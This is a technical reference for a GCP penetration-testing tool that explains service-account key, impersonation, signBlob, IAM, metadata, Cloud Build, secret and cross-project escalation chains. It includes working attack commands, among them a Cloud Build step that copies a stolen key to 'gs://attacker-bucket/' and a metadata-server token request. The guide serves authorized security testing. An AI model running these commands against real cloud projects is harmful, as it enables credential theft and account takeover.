# GCP Privilege Escalation Chain Reference
## Detailed Technical Walkthrough for Pentesters

This document explains every privilege escalation chain that
`GCP-PrivEsc-Tester.ps1` tests, how they work mechanically,
and how to interpret the output.

---

## How the Scripts Work Together

```
┌──────────────────────────────┐
│  1. GCP-PenTest-Enumerator   │   Discovers all resources, IAM
│     projects.txt ──►          │   policies, SAs, compute, etc.
│     GCP_PenTest_Output_*/     │   Generates 00_MANIFEST.json
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│  2. GCP-PrivEsc-Tester        │   Reads manifest, probes
│     -EnumDir <output_dir>     │   permissions, brute-forces
│     -Mode Safe|Aggressive     │   every privesc path,
│     GCP_PrivEsc_Results_*/    │   documents chains
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│  Output Files                 │
│  ├─ 00_CHAIN_REPORT.txt      │   Human-readable chain writeups
│  ├─ 00_CHAINS.json           │   Machine-parseable chains
│  ├─ 00_PROOF_LOG.txt         │   Evidence (tokens, keys, etc.)
│  ├─ 00_CROSS_PROJECT_CHAINS  │   Cross-project pivot paths
│  ├─ 00_CREATED_ARTIFACTS.txt │   Cleanup tracking
│  └─ <project>/               │   Per-project test output
└──────────────────────────────┘
```

---

## Modes Explained

| Mode | What it does | Risk |
|------|-------------|------|
| **Probe** | Reads IAM policies, infers permissions from role bindings. Never calls any write/create API. | Zero. Read-only. |
| **Safe** (default) | Everything in Probe + actively attempts SA key creation, token generation, signBlob, and secret reads. Does NOT create VMs, functions, modify IAM, or write to buckets. | Low. Creates SA keys (trackable). |
| **Aggressive** | Everything in Safe + creates VMs, submits Cloud Builds, writes to buckets/metadata, tests setIamPolicy writes. Requires typed confirmation. | Significant. Creates resources, modifies state. |

---

## Chain Categories & Detailed Explanations

### CHAIN 1: SA Key Creation (SAKEY-*)

```
┌─────────┐   iam.serviceAccountKeys.create   ┌─────────────┐
│   YOU    │ ────────────────────────────────►  │ SA Key JSON │
└─────────┘                                    └──────┬──────┘
                                                      │
                                               gcloud auth activate
                                                      │
                                                      ▼
                                               ┌─────────────┐
                                               │ Persistent   │
                                               │ access as SA │
                                               └─────────────┘
```

**How it works:**
1. `gcloud iam service-accounts keys create` generates a P12/JSON key file
2. This file NEVER expires (unless explicitly revoked)
3. The attacker runs `gcloud auth activate-service-account --key-file=key.json`
4. All subsequent API calls execute as the service account
5. The SA's project-level roles determine what the attacker can now do

**Why it's critical:**
- Keys persist even if the original attacker's access is revoked
- Default compute SAs typically have `roles/editor` (near-full project access)
- There's no mechanism to detect key usage vs. normal SA usage

**What the tester checks:**
- Iterates through every SA in every project
- Attempts `keys create` for each one
- If successful, identifies what roles the SA holds
- Flags default SAs (compute, appspot, cloudbuild) as highest priority

---

### CHAIN 2: SA Token Impersonation (IMPERSONATE-*)

```
┌─────────┐   getAccessToken   ┌──────────────┐
│   YOU    │ ────────────────►  │ OAuth2 token │ ──► ya29.xxxxx (1hr)
└─────────┘                    └──────────────┘
                                      │
                                 any gcloud/API
                                 with --impersonate
                                      │
                                      ▼
                               ┌──────────────┐
                               │ Act as target │
                               │ SA identity   │
                               └──────────────┘
```

**How it works:**
1. If you have `iam.serviceAccounts.getAccessToken` (via `roles/iam.serviceAccountTokenCreator`)
2. You can mint short-lived (1hr) OAuth2 tokens for the target SA
3. These tokens work for any GCP API call
4. The `--impersonate-service-account` flag in gcloud automates this

**What the tester checks:**
- Tries `gcloud auth print-access-token --impersonate-service-account=<SA>` for every SA
- A `ya29.*` response means success
- Records the SA's roles and highlights defaults with Editor

---

### CHAIN 3: signBlob Token Forgery (SIGNBLOB-*)

```
┌─────────┐   signBlob    ┌─────────────┐   exchange    ┌──────────────┐
│   YOU    │ ────────────► │ Signed JWT  │ ────────────► │ Access token │
└─────────┘                └─────────────┘               └──────────────┘
```

**How it works:**
1. `iam.serviceAccounts.signBlob` lets you sign arbitrary data as the SA
2. You construct a JWT claiming to be the SA
3. Sign it via `gcloud iam service-accounts sign-blob`
4. Exchange the signed JWT at Google's token endpoint
5. You receive a valid access token

**Why this is different from impersonation:**
- signBlob may bypass some audit logging that getAccessToken triggers
- It works even if getAccessToken is explicitly denied via IAM conditions
- The resulting token is indistinguishable from a "normal" SA token

---

### CHAIN 4: IAM Policy Modification (SETIAMPOLICY-*)

```
┌─────────┐   setIamPolicy   ┌──────────────┐
│   YOU    │ ────────────────► │ Grant self   │ ──► roles/owner
└─────────┘                   │ any role     │
                              └──────────────┘
           GAME OVER — FULL PROJECT CONTROL
```

**How it works:**
1. `resourcemanager.projects.setIamPolicy` lets you rewrite the project's IAM policy
2. You add `{ role: "roles/owner", members: ["user:you@example.com"] }`
3. You now have Owner — the highest privilege level
4. Owner can: create/delete any resource, read all data, modify all IAM, enable APIs

**Roles that grant this:**
- `roles/owner` (obviously)
- `roles/resourcemanager.projectIamAdmin`
- `roles/iam.securityAdmin`
- Custom roles with `resourcemanager.projects.setIamPolicy`

**What the tester checks:**
- Reads the current IAM policy
- Checks if the caller's roles include setIamPolicy
- In Aggressive mode: re-applies the UNMODIFIED policy (proves write without changing anything)

---

### CHAIN 5: Custom Role Update (CUSTOMROLE-*)

```
┌─────────┐   iam.roles.update   ┌──────────────────┐
│   YOU    │ ────────────────────► │ Add permission   │
└─────────┘                       │ to existing role │
                                  └────────┬─────────┘
                                           │
                                  All identities bound
                                  to that role now have
                                  the new permission
                                           │
                                           ▼
                                  ┌──────────────────┐
                                  │ Stealthy escalation│
                                  │ (no new bindings) │
                                  └──────────────────┘
```

**How it works:**
1. Custom roles contain a list of permissions
2. `iam.roles.update` lets you ADD permissions to an existing custom role
3. Every identity already bound to that role automatically inherits the new permission
4. No new IAM binding is created — this is hard to detect

**Example attack:**
```powershell
# Add setIamPolicy to an existing custom role
gcloud iam roles update CustomDevRole --project=target-proj \
  --add-permissions=resourcemanager.projects.setIamPolicy
# Now every user with CustomDevRole can rewrite IAM
```

---

### CHAIN 6: Compute Metadata SSH Injection (COMPUTE-META-*)

```
┌─────────┐  setMetadata   ┌────────────┐  SSH    ┌──────────┐  curl metadata  ┌──────────┐
│   YOU    │ ──────────────► │ Inject SSH │ ──────► │ Shell on │ ──────────────► │ SA Token │
└─────────┘                 │ public key │         │ instance │                 │ ya29...  │
                            └────────────┘         └──────────┘                 └──────────┘
```

**How it works:**
1. `compute.instances.setMetadata` or `compute.projects.setCommonInstanceMetadata`
2. Inject your SSH public key into instance or project metadata
3. SSH into the instance
4. On the instance: `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
5. The metadata server returns the instance's SA token
6. Use that token for API calls

**Project-wide metadata is especially dangerous:**
- One `setCommonInstanceMetadata` call injects SSH keys into ALL VMs
- Every VM's SA token becomes accessible

---

### CHAIN 7: Compute Instance Creation (COMPUTE-CREATE-*)

```
┌─────────┐  create + actAs   ┌──────────────┐  metadata   ┌──────────┐
│   YOU    │ ─────────────────► │ New VM as    │ ──────────► │ SA Token │
└─────────┘                    │ privileged SA│             │ (Editor) │
                               └──────────────┘             └──────────┘
```

**Requires:** `compute.instances.create` + `iam.serviceAccounts.actAs` on a target SA

**What the tester does (Aggressive mode):**
1. Identifies the most privileged SA in the project
2. Creates a small VM (e2-micro) running as that SA with `cloud-platform` scope
3. Proves the SA token is accessible
4. Immediately deletes the VM

---

### CHAIN 8: Cloud Build Abuse (CLOUDBUILD-*)

```
┌─────────┐  builds.create   ┌────────────────┐  default SA   ┌──────────────┐
│   YOU    │ ────────────────► │ Build step     │ ────────────► │ Editor +     │
└─────────┘                   │ runs commands  │               │ actAs on ALL │
                              └────────────────┘               │ project SAs  │
                                                               └──────────────┘
```

**Why Cloud Build is so powerful:**
- The default Cloud Build SA has `roles/editor` equivalent permissions
- It also has `iam.serviceAccounts.actAs` on ALL SAs in the project
- A single build submission can: create SA keys, modify IAM, access secrets, etc.

**Example build config for exploitation:**
```yaml
steps:
  - name: gcr.io/cloud-builders/gcloud
    entrypoint: bash
    args:
      - -c
      - |
        # Create a key for the compute SA
        gcloud iam service-accounts keys create /workspace/key.json \
          --iam-account=COMPUTE_SA@developer.gserviceaccount.com
        # Upload it somewhere you control
        gsutil cp /workspace/key.json gs://attacker-bucket/
```

---

### CHAIN 9: Secret Access (SECRET-*)

```
┌─────────┐  versions.access   ┌──────────────┐
│   YOU    │ ──────────────────► │ Secret value │ ──► Could be SA key, DB creds,
└─────────┘                     └──────────────┘      API token, private key, etc.
```

**What the tester does:**
- Brute-forces `gcloud secrets versions access latest --secret=<NAME>` for every secret
- Automatically classifies the secret type (SA key JSON, private key, DB string, etc.)
- SA key secrets are especially critical — they're chains into additional SAs

---

### CHAIN 10: Delegation Chains (DELEGATION-*)

```
┌─────────┐  impersonate   ┌────────┐  impersonate   ┌────────┐
│   YOU    │ ──────────────► │  SA_A  │ ──────────────► │  SA_B  │  (Editor)
└─────────┘  (tokenCreator) └────────┘  (tokenCreator) └────────┘
```

**How multi-hop delegation works:**
1. You can impersonate SA_A
2. SA_A has `roles/iam.serviceAccountTokenCreator` on SA_B
3. Using `--delegates=SA_A`, you can get a token for SA_B through SA_A
4. This chains to SA_B's full privileges

**What the tester does:**
- Builds a graph of all SA → SA impersonation relationships from enumeration data
- Finds multi-hop chains where the end target has elevated privileges
- Identifies chains that start from the current caller's identity

---

### CHAIN 11: Cross-Project Pivots (XPROJECT-*)

```
┌───────────┐               ┌───────────┐
│ Project A │               │ Project B │
│           │               │           │
│  SA_X ────┼──── same ─────┼──── SA_X  │
│  (viewer) │   identity    │  (editor) │
└───────────┘               └───────────┘

Compromise SA_X in Project A ──► Editor in Project B
```

**What the tester does:**
- Maps every SA to every project where it has role bindings
- Identifies SAs that span multiple projects
- Calculates the "blast radius" of compromising each cross-project SA

---

## Reading the Output Files

### 00_CHAIN_REPORT.txt
Human-readable. Each chain has:
- **ID**: Unique identifier (e.g., SAKEY-myproject-1)
- **Severity**: CRITICAL / HIGH / MEDIUM
- **Initial Access**: What permission you started with
- **Target Privilege**: What you escalated to
- **Steps**: Numbered explanation of the attack
- **Commands**: Copy-paste gcloud commands to reproduce

### 00_CHAINS.json
Machine-parseable. Same data as above in JSON for scripting:
```powershell
# Find all critical chains
$chains = Get-Content .\00_CHAINS.json | ConvertFrom-Json
$chains | Where-Object { $_.severity -eq "CRITICAL" } | ForEach-Object {
    "$($_.id): $($_.title)"
}
```

### 00_CROSS_PROJECT_CHAINS.txt
Lists every SA that spans multiple projects with its roles per project.

### 00_CREATED_ARTIFACTS.txt
IMPORTANT for cleanup. Lists every SA key, VM, metadata change, etc. that was
created during testing. Review this after every Aggressive mode run.

---

## Quick-Start Workflow

```powershell
# Step 1: Enumerate
.\GCP-PenTest-Enumerator.ps1

# Step 2: Safe test (recommended first pass)
.\GCP-PrivEsc-Tester.ps1 -EnumDir .\GCP_PenTest_Output_20260223_100000

# Step 3: Review chains
Get-Content .\GCP_PrivEsc_Results_*\00_CHAIN_REPORT.txt

# Step 4: Aggressive test on specific projects (with authorization)
.\GCP-PrivEsc-Tester.ps1 -EnumDir .\GCP_PenTest_Output_20260223_100000 `
    -Mode Aggressive -TargetProjects "high-value-project"

# Step 5: Clean up
Get-Content .\GCP_PrivEsc_Results_*\00_CREATED_ARTIFACTS.txt
```
